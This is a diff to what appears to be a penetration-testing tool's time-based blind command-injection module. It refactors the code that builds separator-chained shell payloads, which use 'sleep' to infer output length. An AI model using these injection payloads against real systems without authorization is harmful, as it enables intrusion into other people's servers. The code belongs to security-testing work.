@@ -36,7 +36,7 @@ way: '${#var}' counts characters where this counts bytes, and a length that disa
 indexing would have the retrieval ask for characters that are not where it was told they are.
 """
 def _length_expr(word):
-  return settings.CMD_SUB_PREFIX + "printf '%s' \"" + word + "\" | wc -c" + settings.CMD_SUB_SUFFIX
+  return settings.CMD_SUB_PREFIX + checks.print_value("\"" + word + "\"") + " | wc -c" + settings.CMD_SUB_SUFFIX
 
 """
 The same count, handed to 'awk' as an argument instead of carried in a variable. A separator that
@@ -208,7 +208,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
   else:
     if separator in (";", "\n", "\r\n"):
       payload = (separator +
-                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
@@ -226,13 +226,13 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       """
       payload = (separator +
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==" +
-                 _output_word("echo " + str(len(TAG))) + ")))"
+                 _output_word(checks.print_marker(str(len(TAG)))) + ")))"
                  )
     elif separator == "&":
       # Backticks cannot nest, so the measurement is carried in a variable here - which '&' cannot
       # hand on to the command after it, leaving the '&&' below to hold it.
       payload = (separator +
-                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + "&&" +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.CMD_SUB_SUFFIX + "&&" +
                  "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
                  )
@@ -240,7 +240,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       ampersand = "&"
       payload = (ampersand +
                  "sleep 0 " + separator +
-                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
